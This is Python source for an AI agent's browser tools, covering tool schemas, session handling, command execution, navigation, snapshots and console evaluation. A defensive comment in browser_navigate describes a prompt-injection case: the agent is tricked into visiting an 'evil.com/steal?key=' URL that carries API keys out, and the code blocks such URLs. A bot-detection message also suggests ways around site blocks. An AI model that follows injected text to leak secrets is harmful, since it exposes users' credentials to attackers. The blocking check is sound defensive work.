        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 8000 chars are truncated or LLM-summarized. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content.",
        "parameters": {
            "type": "object",
            "properties": {
                "full": {
                    "type": "boolean",
                    "description": "If true, returns complete page content. If false (default), returns compact view with interactive elements only.",
                    "default": False
                }
            },
            "required": []
        }
    },
    {
        "name": "browser_click",
        "description": "Click on an element identified by its ref ID from the snapshot (e.g., '@e5'). The ref IDs are shown in square brackets in the snapshot output. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"
                }
            },
            "required": ["ref"]
        }
    },
    {
        "name": "browser_type",
        "description": "Type text into an input field identified by its ref ID. Clears the field first, then types the new text. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e3')"
                },
                "text": {
                    "type": "string",
                    "description": "The text to type into the field"
                }
            },
            "required": ["ref", "text"]
        }
    },
    {
        "name": "browser_scroll",
        "description": "Scroll the page in a direction. Use this to reveal more content that may be below or above the current viewport. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "direction": {
                    "type": "string",
                    "enum": ["up", "down"],
                    "description": "Direction to scroll"
                }
            },
            "required": ["direction"]
        }
    },
    {
        "name": "browser_back",
        "description": "Navigate back to the previous page in browser history. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_press",
        "description": "Press a keyboard key. Useful for submitting forms (Enter), navigating (Tab), or keyboard shortcuts. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "key": {
                    "type": "string",
                    "description": "Key to press (e.g., 'Enter', 'Tab', 'Escape', 'ArrowDown')"
                }
            },
            "required": ["key"]
        }
    },
    {
        "name": "browser_get_images",
        "description": "Get a list of all images on the current page with their URLs and alt text. Useful for finding images to analyze with the vision tool. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_vision",
        "description": "Take a screenshot of the current page so you can inspect it visually. Use this when you need to understand what the page looks like - especially for CAPTCHAs, visual verification challenges, complex layouts, or cases where the text snapshot misses important visual information. When your active model has native vision, the screenshot is attached to your context directly and you inspect it on the next turn; models without image support report a capability error. Includes a screenshot_path that you can share with the user by including MEDIA:<screenshot_path> in your response. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "question": {
                    "type": "string",
                    "description": "What you want to know about the page visually. Be specific about what you're looking for."
                },
                "annotate": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, overlay numbered [N] labels on interactive elements. Each [N] maps to ref @eN for subsequent browser commands. Useful for QA and spatial reasoning about page layout."
                }
            },
            "required": ["question"]
        }
    },
    {
        "name": "browser_console",
        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result — use this for DOM inspection, reading page state, or extracting data programmatically.",
        "parameters": {
            "type": "object",
            "properties": {
                "clear": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, clear the message buffers after reading"
                },
                "expression": {
                    "type": "string",
                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'"
                }
            },
            "required": []
        }
    },
]


# ============================================================================
# Utility Functions
# ============================================================================

def _create_local_session(task_id: str) -> Dict[str, str]:
    import uuid
    session_name = f"h_{uuid.uuid4().hex[:10]}"
    logger.info("Created local browser session %s for task %s",
                session_name, task_id)
    return {
        "session_name": session_name,
        "cdp_url": None,
        "features": {"local": True},
    }


def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
    """Create a session that connects to a user-supplied CDP endpoint."""
    import uuid
    session_name = f"cdp_{uuid.uuid4().hex[:10]}"
    logger.info("Created CDP browser session %s → %s for task %s",
                session_name, cdp_url, task_id)
    return {
        "session_name": session_name,
        "cdp_url": cdp_url,
        "features": {"cdp_override": True},
    }


def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
    """Get or create a local or user-supplied CDP browser session."""
    task_id = task_id or "default"
    _start_browser_cleanup_thread()
    _update_session_activity(task_id)

    with _cleanup_lock:
        existing = _active_sessions.get(task_id)
        if existing is not None:
            return existing

    cdp_override = _get_cdp_override()
    session_info = (
        _create_cdp_session(task_id, cdp_override)
        if cdp_override
        else _create_local_session(task_id)
    )

    with _cleanup_lock:
        existing = _active_sessions.get(task_id)
        if existing is not None:
            return existing
        _active_sessions[task_id] = session_info

    if cdp_override:
        _ensure_cdp_supervisor(task_id)
    return session_info



def _find_agent_browser() -> str:
    """
    Find the agent-browser CLI executable.

    Checks in order: current PATH, Homebrew/common bin dirs, Marlow-managed
    node, local node_modules/.bin/, npx fallback.

    Returns:
        Path to agent-browser executable

    Raises:
        FileNotFoundError: If agent-browser is not installed
    """
    global _cached_agent_browser, _agent_browser_resolved
    if _agent_browser_resolved:
        if _cached_agent_browser is None:
            raise FileNotFoundError(
                "agent-browser CLI not found (cached). Install it with: "
                f"{_browser_install_hint()}\n"
                "Or run 'npm install' in the repo root to install locally.\n"
                "Or ensure npx is available in your PATH."
            )
        return _cached_agent_browser

    # Note: _agent_browser_resolved is set at each return site below
    # (not before the search) to prevent a race where a concurrent thread
    # sees resolved=True but _cached_agent_browser is still None.

    # Check if it's in PATH (global install)
    which_result = shutil.which("agent-browser")
    if which_result:
        _cached_agent_browser = which_result
        _agent_browser_resolved = True
        return which_result

    # Build an extended search PATH including Marlow-managed Node, macOS
    # versioned Homebrew installs, and fallback system directories.
    extended_path = _merge_browser_path("")
    if extended_path:
        which_result = shutil.which("agent-browser", path=extended_path)
        if which_result:
            _cached_agent_browser = which_result
            _agent_browser_resolved = True
            return which_result

    # Check local node_modules/.bin/ (npm install in repo root).
    repo_root = Path(__file__).parent.parent
    local_bin_dir = repo_root / "node_modules" / ".bin"
    if local_bin_dir.is_dir():
        local_which = shutil.which("agent-browser", path=str(local_bin_dir))
        if local_which:
            _cached_agent_browser = local_which
            _agent_browser_resolved = True
            return _cached_agent_browser

    # Check common npx locations (also search the extended fallback PATH)
    npx_path = shutil.which("npx")
    if not npx_path and extended_path:
        npx_path = shutil.which("npx", path=extended_path)
    if npx_path:
        _cached_agent_browser = "npx agent-browser"
        _agent_browser_resolved = True
        return _cached_agent_browser

    # Nothing found — try lazy installation before giving up.
    try:
        from marlow_cli.dep_ensure import ensure_dependency
        if ensure_dependency("browser"):
            recheck = shutil.which("agent-browser")
            if not recheck and extended_path:
                recheck = shutil.which("agent-browser", path=extended_path)
            if not recheck:
                marlow_nm = str(get_marlow_home() / "node_modules" / ".bin")
                recheck = shutil.which("agent-browser", path=marlow_nm)
            if not recheck:
                marlow_node_bin = str(get_marlow_home() / "node" / "bin")
                recheck = shutil.which("agent-browser", path=marlow_node_bin)
            if not recheck:
                marlow_node_root = str(get_marlow_home() / "node")
                recheck = shutil.which("agent-browser", path=marlow_node_root)
            if recheck:
                _cached_agent_browser = recheck
                _agent_browser_resolved = True
                return recheck
    except Exception:
        pass

    _agent_browser_resolved = True
    raise FileNotFoundError(
        "agent-browser CLI not found. Install it with: "
        f"{_browser_install_hint()}\n"
        "Or run 'npm install' in the repo root to install locally.\n"
        "Or ensure npx is available in your PATH."
    )


def _extract_screenshot_path_from_text(text: str) -> Optional[str]:
    """Extract a screenshot file path from agent-browser human-readable output."""
    if not text:
        return None

    patterns = [
        r"Screenshot saved to ['\"](?P<path>/[^'\"]+?\.png)['\"]",
        r"Screenshot saved to (?P<path>/\S+?\.png)(?:\s|$)",
        r"(?P<path>/\S+?\.png)(?:\s|$)",
    ]

    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            path = match.group("path").strip().strip("'\"")
            if path:
                return path

    return None


def _run_browser_command(
    task_id: str,
    command: str,
    args: List[str] = None,
    timeout: Optional[int] = None,
    _engine_override: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Run an agent-browser CLI command using a local or attached CDP session.

    Args:
        task_id: Task identifier to get the right session
        command: The command to run (e.g., "open", "click")
        args: Additional arguments for the command
        timeout: Command timeout in seconds.  ``None`` reads
                 ``browser.command_timeout`` from config (default 30s).
        _engine_override: Force a specific engine for this call only.  Used
                          internally by the Lightpanda fallback to retry with
                          Chrome without touching global state.

    Returns:
        Parsed JSON response from agent-browser
    """
    if timeout is None:
        timeout = _get_command_timeout()
    args = args or []

    # Build the command
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        logger.warning("agent-browser CLI not found: %s", e)
        return {"success": False, "error": str(e)}

    # Local mode with no Chromium on disk: fail fast with an actionable
    # message instead of hanging for _command_timeout seconds per call.
    # Skip when engine=lightpanda — LP doesn't need Chromium for navigation.
    if _is_local_mode() and not _chromium_installed() and _get_browser_engine() != "lightpanda":
        if _running_in_docker():
            hint = (
                "Chromium browser is missing. You're running in Docker — rebuild "
                "the image from the latest Marlow checkout with: "
                "docker compose build --pull"
            )
        else:
            hint = (
                "Chromium browser is missing. Install it with: "
                "npx agent-browser install --with-deps "
                "(or: npx playwright install --with-deps chromium)"
            )
        logger.warning("browser command blocked: %s", hint)
        return {"success": False, "error": hint}

    from tools.interrupt import is_interrupted
    if is_interrupted():
        return {"success": False, "error": "Interrupted"}

    # Get or create the session.
    try:
        session_info = _get_session_info(task_id)
    except Exception as e:
        logger.warning("Failed to create browser session for task=%s: %s", task_id, e)
        return {"success": False, "error": f"Failed to create browser session: {str(e)}"}

    # Build the command for an attached CDP browser or local launch.
    # The rest of the command (--json, command, args) is identical.
    if session_info.get("cdp_url"):
        # IMPORTANT: Do NOT use --session with --cdp. In agent-browser >=0.13,
        # --session creates a local browser instance and silently ignores --cdp.
        backend_args = ["--cdp", session_info["cdp_url"]]
    else:
        # Local mode — launch a headless Chromium instance
        backend_args = ["--session", session_info["session_name"]]

    # Lightpanda engine injection (local launch only, agent-browser v0.25.3+).
    engine = _engine_override or _get_browser_engine()
    if engine != "auto" and not session_info.get("cdp_url"):
        backend_args += ["--engine", engine]

    # Keep concrete executable paths intact, even when they contain spaces.
    # Only the synthetic npx fallback needs to expand into multiple argv items.
    # Resolve npx from PATH when available.
    if browser_cmd == "npx agent-browser":
        _npx_bin = shutil.which("npx") or "npx"
        cmd_prefix = [_npx_bin, "agent-browser"]
    else:
        cmd_prefix = [browser_cmd]

    cmd_parts = cmd_prefix + backend_args + [
        "--json",
        command
    ] + args

    try:
        # Give each task its own socket directory to prevent concurrency conflicts.
        # Without this, parallel workers fight over the same default socket path,
        # causing "Failed to create socket directory: Permission denied" errors.
        task_socket_dir = os.path.join(
            _socket_safe_tmpdir(),
            f"agent-browser-{session_info['session_name']}"
        )
        os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
        # Record this marlow PID as the session owner (cross-process safe
        # orphan detection — see _write_owner_pid).
        _write_owner_pid(task_socket_dir, session_info['session_name'])
        logger.debug("browser cmd=%s task=%s socket_dir=%s (%d chars)",
                     command, task_id, task_socket_dir, len(task_socket_dir))

        browser_env = dict(__import__("agent.codex_environment", fromlist=["managed_environment"]).managed_environment().overrides()["shell_environment_policy"]["set"])

        # Ensure subprocesses inherit the same browser-specific PATH fallbacks
        # used during CLI discovery.
        browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))
        browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir

        # Tell the agent-browser daemon to self-terminate after being idle
        # for our configured inactivity timeout.  This is the daemon-side
        # counterpart to our Python-side _cleanup_inactive_browser_sessions
        # — the daemon kills itself and its Chrome children when no CLI
        # commands arrive within the window.  Added in agent-browser 0.24.
        if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
            idle_ms = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
            browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = idle_ms

        # Inject --no-sandbox when needed (issue #15765):
        # - Running as root: Chromium always refuses to start without it
        # - Ubuntu 23.10+ / AppArmor systems: unprivileged user namespaces
        #   are restricted, causing Chromium to exit with "No usable sandbox"
        #   even for non-root users running under systemd or containers.
        # Honour either the legacy AGENT_BROWSER_CHROME_FLAGS (never consumed by
        # agent-browser itself, but documented in older notes) or the real
        # AGENT_BROWSER_ARGS — if the user pre-sets either, don't overwrite it.
        if (
            "AGENT_BROWSER_ARGS" not in browser_env
            and "AGENT_BROWSER_CHROME_FLAGS" not in browser_env
        ):
            _needs_sandbox_bypass = False
            if hasattr(os, "geteuid") and os.geteuid() == 0:
                _needs_sandbox_bypass = True
                logger.debug("browser: running as root — injecting --no-sandbox")
            else:
                # Detect AppArmor user namespace restrictions (Ubuntu 23.10+)
                _userns_restrict = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
                try:
                    with open(_userns_restrict, encoding="utf-8") as _f:
                        if _f.read().strip() == "1":
                            _needs_sandbox_bypass = True
                            logger.debug(
                                "browser: AppArmor userns restrictions detected — "
                                "injecting --no-sandbox"
                            )
                except OSError:
                    pass
            if _needs_sandbox_bypass:
                browser_env["AGENT_BROWSER_ARGS"] = (
                    "--no-sandbox,--disable-dev-shm-usage"
                )

        # Use temp files for stdout/stderr instead of pipes.
        # agent-browser starts a background daemon that inherits file
        # descriptors.  With capture_output=True (pipes), the daemon keeps
        # the pipe fds open after the CLI exits, so communicate() never
        # sees EOF and blocks until the timeout fires.
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{command}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{command}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            proc = subprocess.Popen(
                cmd_parts,
                stdout=stdout_fd,
                stderr=stderr_fd,
                stdin=subprocess.DEVNULL,
                env=browser_env,
                cwd=str(__import__("agent.codex_environment", fromlist=["managed_environment"]).managed_environment().workspace),
            )
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)

        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)",
                           command, timeout, task_id, task_socket_dir)
            result = {"success": False, "error": f"Command timed out after {timeout} seconds"}
            # Fall through to fallback check below
        else:
            with open(stdout_path, "r", encoding="utf-8") as f:
                stdout = f.read()
            with open(stderr_path, "r", encoding="utf-8") as f:
                stderr = f.read()
            returncode = proc.returncode

            # Clean up temp files (best-effort)
            for p in (stdout_path, stderr_path):
                try:
                    os.unlink(p)
                except OSError:
                    pass

            # Log stderr for diagnostics — use warning level on failure so it's visible
            if stderr and stderr.strip():
                level = logging.WARNING if returncode != 0 else logging.DEBUG
                logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])

            stdout_text = stdout.strip()

            # Empty output with rc=0 is a broken state — treat as failure rather
            # than silently returning {"success": True, "data": {}}.
            # Some commands (close, record) legitimately return no output.
            if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
                logger.warning("browser '%s' returned empty output (rc=0)", command)
                result = {"success": False, "error": f"Browser command '{command}' returned no output"}
            elif stdout_text:
                try:
                    parsed = json.loads(stdout_text)
                    # Warn if snapshot came back empty (common sign of daemon/CDP issues)
                    if command == "snapshot" and parsed.get("success"):
                        snap_data = parsed.get("data", {})
                        if not snap_data.get("snapshot") and not snap_data.get("refs"):
                            logger.warning("snapshot returned empty content. "
                                           "Possible stale daemon or CDP connection issue. "
                                           "returncode=%s", returncode)
                    result = parsed
                except json.JSONDecodeError:
                    raw = stdout_text[:2000]
                    logger.warning("browser '%s' returned non-JSON output (rc=%s): %s",
                                   command, returncode, raw[:500])

                    if command == "screenshot":
                        stderr_text = (stderr or "").strip()
                        combined_text = "\n".join(
                            part for part in [stdout_text, stderr_text] if part
                        )
                        recovered_path = _extract_screenshot_path_from_text(combined_text)

                        if recovered_path and Path(recovered_path).exists():
                            logger.info(
                                "browser 'screenshot' recovered file from non-JSON output: %s",
                                recovered_path,
                            )
                            result = {
                                "success": True,
                                "data": {
                                    "path": recovered_path,
                                    "raw": raw,
                                },
                            }
                        else:
                            result = {
                                "success": False,
                                "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
                            }
                    else:
                        result = {
                            "success": False,
                            "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
                        }
            elif returncode != 0:
                # Check for errors
                error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
                logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
                result = {"success": False, "error": error_msg}
            else:
                result = {"success": True, "data": {}}

    except Exception as e:
        logger.warning("browser '%s' exception: %s", command, e, exc_info=True)
        result = {"success": False, "error": str(e)}

    # --- Lightpanda automatic Chrome fallback ---
    # If engine is lightpanda and the result looks broken, retry with Chrome.
    # This runs for ALL exit paths (timeout, empty, non-JSON, nonzero rc, parsed).
    fallback_reason = _lightpanda_fallback_reason(engine, command, result)
    if fallback_reason:
        logger.info(
            "Lightpanda fallback: retrying '%s' with Chrome (task=%s): %s",
            command,
            task_id,
            fallback_reason,
        )
        # For screenshots, use the dedicated Chrome fallback helper
        # (spins up a separate Chrome session to the same URL).
        if command == "screenshot":
            fallback_result = _chrome_fallback_screenshot(task_id, args or [], timeout)
        else:
            fallback_result = _run_chrome_fallback_command(task_id, command, args, timeout)
        return _annotate_lightpanda_fallback(fallback_result, fallback_reason)

    return result


def _extract_relevant_content(snapshot_text, instruction=None, **kwargs):
    """Return browser evidence locally; Codex performs any requested reasoning."""
    from agent.redact import redact_sensitive_text
    return redact_sensitive_text(_truncate_snapshot(snapshot_text), force=True)



def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
    """Structure-aware truncation for snapshots.

    Cuts at line boundaries so that accessibility tree elements are never
    split mid-line, and appends a note telling the agent how much was
    omitted.

    Args:
        snapshot_text: The snapshot text to truncate
        max_chars: Maximum characters to keep

    Returns:
        Truncated text with indicator if truncated
    """
    if len(snapshot_text) <= max_chars:
        return snapshot_text

    lines = snapshot_text.split('\n')
    result: list[str] = []
    chars = 0
    for line in lines:
        if chars + len(line) + 1 > max_chars - 80:  # reserve space for note
            break
        result.append(line)
        chars += len(line) + 1
    remaining = len(lines) - len(result)
    if remaining > 0:
        result.append(f'\n[... {remaining} more lines truncated, use browser_snapshot for full content]')
    return '\n'.join(result)


# ============================================================================
# Browser Tool Functions
# ============================================================================

def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
    """
    Navigate to a URL in the browser.

    Args:
        url: The URL to navigate to
        task_id: Task identifier for session isolation

    Returns:
        JSON string with navigation result (includes stealth features info on first nav)
    """
    # Secret exfiltration protection — block URLs that embed API keys or
    # tokens in query parameters. A prompt injection could trick the agent
    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
    import urllib.parse
    from agent.redact import _PREFIX_RE
    url_decoded = urllib.parse.unquote(url)
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL contains what appears to be an API key or token. "
                     "Secrets must not be sent in URLs.",
        })

    effective_task_id = task_id or "default"
    nav_session_key = _navigation_session_key(effective_task_id, url)

    # Website policy check — block before navigating
    blocked = check_website_access(url)
    if blocked:
        return json.dumps({
            "success": False,
            "error": blocked["message"],
            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
        })

    # Get session info to check if this is a new session
    # (will create one with features logged if not exists)
    session_info = _get_session_info(nav_session_key)
    is_first_nav = session_info.get("_first_nav", True)

    # Auto-start recording if configured and this is first navigation
    if is_first_nav:
        session_info["_first_nav"] = False
        _maybe_start_recording(nav_session_key)

    result = _run_browser_command(nav_session_key, "open", [url], timeout=max(_get_command_timeout(), 60))

    # Remember which session served this navigation.
    _last_active_session_key[effective_task_id] = nav_session_key

    if result.get("success"):
        data = result.get("data", {})
        title = data.get("title", "")
        final_url = data.get("url", url)

        response = {
            "success": True,
            "url": final_url,
            "title": title
        }
        _copy_fallback_warning(response, result)

        # Detect common "blocked" page patterns from title/url
        blocked_patterns = [
            "access denied", "access to this page has been denied",
            "blocked", "bot detected", "verification required",
            "please verify", "are you a robot", "captcha",
            "cloudflare", "ddos protection", "checking your browser",
            "just a moment", "attention required"
        ]
        title_lower = title.lower()

        if any(pattern in title_lower for pattern in blocked_patterns):
            response["bot_detection_warning"] = (
                f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
                "Options: 1) Try adding delays between actions, 2) Access different pages first, "
                "3) Some sites have very aggressive bot detection that may be unavoidable."
            )

        # Include feature info on first navigation so model knows what's active
        if is_first_nav and "features" in session_info:
            features = session_info["features"]
            active_features = [k for k, v in features.items() if v]
            response["stealth_features"] = active_features

        # Auto-take a compact snapshot so the model can act immediately
        # without a separate browser_snapshot call.
        try:
            snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
            if snap_result.get("success"):
                snap_data = snap_result.get("data", {})
                snapshot_text = snap_data.get("snapshot", "")
                refs = snap_data.get("refs", {})
                if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
                    snapshot_text = _truncate_snapshot(snapshot_text)
                response["snapshot"] = snapshot_text
                response["element_count"] = len(refs) if refs else 0
                if snap_result.get("fallback_warning") and not response.get("fallback_warning"):
                    _copy_fallback_warning(response, snap_result)
        except Exception as e:
            logger.debug("Auto-snapshot after navigate failed: %s", e)

        return json.dumps(response, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", "Navigation failed")
        }, ensure_ascii=False)


def browser_snapshot(
    full: bool = False,
    task_id: Optional[str] = None,
    user_task: Optional[str] = None
) -> str:
    """
    Get a text-based snapshot of the current page's accessibility tree.

    Args:
        full: If True, return complete snapshot. If False, return compact view.
        task_id: Task identifier for session isolation
        user_task: The user's current task (for task-aware extraction)

    Returns:
        JSON string with page snapshot
    """

    effective_task_id = _last_session_key(task_id or "default")

    # Build command args based on full flag
    args = []
    if not full:
        args.extend(["-c"])  # Compact mode

    result = _run_browser_command(effective_task_id, "snapshot", args)

    if result.get("success"):
        data = result.get("data", {})
        snapshot_text = data.get("snapshot", "")
        refs = data.get("refs", {})

        # Check if snapshot needs summarization
        if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
            snapshot_text = _extract_relevant_content(snapshot_text, user_task)
        elif len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
            snapshot_text = _truncate_snapshot(snapshot_text)

        response = {
            "success": True,
            "snapshot": snapshot_text,
            "element_count": len(refs) if refs else 0
        }
        _copy_fallback_warning(response, result)

        # Merge supervisor state (pending dialogs + frame tree) when a CDP
        # supervisor is attached to this task. No-op otherwise. See
        # website/docs/developer-guide/browser-supervisor.md.
        try:
            from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
            _supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
            if _supervisor is not None:
                _sv_snap = _supervisor.snapshot()
                if _sv_snap.active:
                    response.update(_sv_snap.to_dict())
        except Exception as _sv_exc:
            logger.debug("supervisor snapshot merge failed: %s", _sv_exc)

        return json.dumps(response, ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to get snapshot")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_click(ref: str, task_id: Optional[str] = None) -> str:
    """
    Click on an element.

    Args:
        ref: Element reference (e.g., "@e5")
        task_id: Task identifier for session isolation

    Returns:
        JSON string with click result
    """

    effective_task_id = _last_session_key(task_id or "default")

    # Ensure ref starts with @
    if not ref.startswith("@"):
        ref = f"@{ref}"

    result = _run_browser_command(effective_task_id, "click", [ref])

    if result.get("success"):
        response = {
            "success": True,
            "clicked": ref
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", f"Failed to click {ref}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
    """
    Type text into an input field.

    Args:
        ref: Element reference (e.g., "@e3")
        text: Text to type
        task_id: Task identifier for session isolation

    Returns:
        JSON string with type result
    """

    effective_task_id = _last_session_key(task_id or "default")

    # Ensure ref starts with @
    if not ref.startswith("@"):
        ref = f"@{ref}"

    # Use fill command (clears then types)
    result = _run_browser_command(effective_task_id, "fill", [ref, text])

    if result.get("success"):
        response = {
            "success": True,
            "typed": text,
            "element": ref
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", f"Failed to type into {ref}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
    """
    Scroll the page.

    Args:
        direction: "up" or "down"
        task_id: Task identifier for session isolation

    Returns:
        JSON string with scroll result
    """
    # Validate direction
    if direction not in {"up", "down"}:
        return json.dumps({
            "success": False,
            "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
        }, ensure_ascii=False)

    # Single scroll with pixel amount instead of 5x subprocess calls.
    # agent-browser supports: agent-browser scroll down 500
    # ~500px is roughly half a viewport of travel.
    _SCROLL_PIXELS = 500


    effective_task_id = _last_session_key(task_id or "default")

    result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
    if not result.get("success"):
        response = {
            "success": False,
            "error": result.get("error", f"Failed to scroll {direction}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    response = {
        "success": True,
        "scrolled": direction
    }
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_back(task_id: Optional[str] = None) -> str:
    """
    Navigate back in browser history.

    Args:
        task_id: Task identifier for session isolation

    Returns:
        JSON string with navigation result
    """

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(effective_task_id, "back", [])

    if result.get("success"):
        data = result.get("data", {})
        response = {
            "success": True,
            "url": data.get("url", "")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to go back")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_press(key: str, task_id: Optional[str] = None) -> str:
    """
    Press a keyboard key.

    Args:
        key: Key to press (e.g., "Enter", "Tab")
        task_id: Task identifier for session isolation

    Returns:
        JSON string with key press result
    """

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(effective_task_id, "press", [key])

    if result.get("success"):
        response = {
            "success": True,
            "pressed": key
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", f"Failed to press {key}")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)





def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
    """Get browser console messages and JavaScript errors, or evaluate JS in the page.

    When ``expression`` is provided, evaluates JavaScript in the page context
    (like the DevTools console) and returns the result.  Otherwise returns
    console output (log/warn/error/info) and uncaught exceptions.

    Args:
        clear: If True, clear the message/error buffers after reading
        expression: JavaScript expression to evaluate in the page context
        task_id: Task identifier for session isolation

    Returns:
        JSON string with console messages/errors, or eval result
    """
    # --- JS evaluation mode ---
    if expression is not None:
        return _browser_eval(expression, task_id)

    # --- Console output mode (original behaviour) ---

    effective_task_id = _last_session_key(task_id or "default")

    console_args = ["--clear"] if clear else []
    error_args = ["--clear"] if clear else []

    console_result = _run_browser_command(effective_task_id, "console", console_args)
    errors_result = _run_browser_command(effective_task_id, "errors", error_args)

    messages = []
    if console_result.get("success"):
        for msg in console_result.get("data", {}).get("messages", []):
            messages.append({
                "type": msg.get("type", "log"),
                "text": msg.get("text", ""),
                "source": "console",
            })

    errors = []
    if errors_result.get("success"):
        for err in errors_result.get("data", {}).get("errors", []):
            errors.append({
                "message": err.get("message", ""),
                "source": "exception",
            })

    response = {
        "success": True,
        "console_messages": messages,
        "js_errors": errors,
        "total_messages": len(messages),
        "total_errors": len(errors),
    }
    _copy_fallback_warning(response, console_result)
    if errors_result.get("fallback_warning") and not response.get("fallback_warning"):
        _copy_fallback_warning(response, errors_result)
    return json.dumps(response, ensure_ascii=False)


def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
    """Evaluate a JavaScript expression in the page context and return the result."""

    effective_task_id = _last_session_key(task_id or "default")

    # --- Fast path: route through the supervisor's persistent CDP WS ---------
    # When a CDPSupervisor is alive for this task_id, ``Runtime.evaluate`` runs
    # on the already-connected WebSocket — zero subprocess startup cost vs
    # spawning an ``agent-browser eval`` CLI process.  Falls through to the
    # subprocess path on any error so behaviour is unchanged when no
    # supervisor is running (e.g. plain agent-browser without a CDP backend).
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
        supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
        if supervisor is not None:
            sup_result = supervisor.evaluate_runtime(expression)
